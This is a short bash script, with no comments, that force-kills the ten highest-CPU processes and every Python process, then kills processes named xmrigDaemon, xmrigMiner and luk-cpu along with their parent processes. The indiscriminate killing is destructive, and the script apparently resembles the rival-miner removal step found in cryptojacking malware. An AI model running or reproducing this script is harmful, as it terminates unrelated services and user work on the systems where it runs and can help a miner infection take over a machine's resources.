#!/bin/bash


for i in `ps -eo pid,%cpu --sort=-%cpu | head -n 10 | awk '{print $1}'`; do
    kill -9 $i
done
kill -9 `pidof python`
for i in `pidof luk-cpu`; do
   pid=$i
   ppid=`ps -p $pid -o ppid=`
   kill -9 $ppid $pid
done
for i in `pidof xmrigDaemon`; do
   pid=$i
   ppid=`ps -p $pid -o ppid=`
   kill -9 $ppid $pid
done
for i in `pidof xmrigMiner`; do
   pid=$i
   ppid=`ps -p $pid -o ppid=`
   kill -9 $ppid $pid
done
